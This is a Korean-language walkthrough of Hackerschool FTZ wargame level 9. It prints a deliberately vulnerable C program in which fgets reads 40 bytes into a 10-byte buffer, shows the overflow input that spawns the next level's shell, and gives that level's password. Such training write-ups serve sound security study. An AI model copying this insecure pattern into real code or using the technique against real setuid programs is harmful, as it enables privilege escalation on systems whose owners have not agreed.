# Hackerschool FTZ Level 09

```
login as: level9
level9@192.168.18.131's password:
[level9@ftz level9]$ ls
hint  public_html  tmp
[level9@ftz level9]$ cat hint


다음은 /usr/bin/bof의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(){

  char buf2[10];
  char buf[10];

  printf("It can be overflow : ");
  fgets(buf,40,stdin);

  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }

}

이를 이용하여 level10의 권한을 얻어라.


[level9@ftz level9]$ /usr/bin/bof Hello
It can be overflow : Hello
[level9@ftz level9]$ /usr/bin/bof Hello
It can be overflow :
[level9@ftz level9]$ /usr/bin/bof
It can be overflow : HelloHellogogogogogogogogogogo
Good Skill!
[level10@ftz level9]$ my-pass

Level10 Password is "interesting to hack!".

[level10@ftz level9]$
```

`Buffer Overflow` 에 해 공부할 수 있는 문제이다.

`/usr/bin/bof` 의 소스를 보면 `buf2` 의 앞 2글자가 `go` 라면 다음 레벨 유저의 쉘을 실행시켜준다.

`fgets` 함수에서 40 글자를 입력받기에 버퍼오버플로우 취약점이 터진다.

`buf` 배열과 `buf2` 배열의 거리를 확실히 모르니, 10글자 이후에 계속 `go` 를 입력하여 풀었다.

```
[level9@ftz level9]$ /usr/bin/bof
It can be overflow : HelloHellogogogogogogogogogogo
Good Skill!
[level10@ftz level9]$
```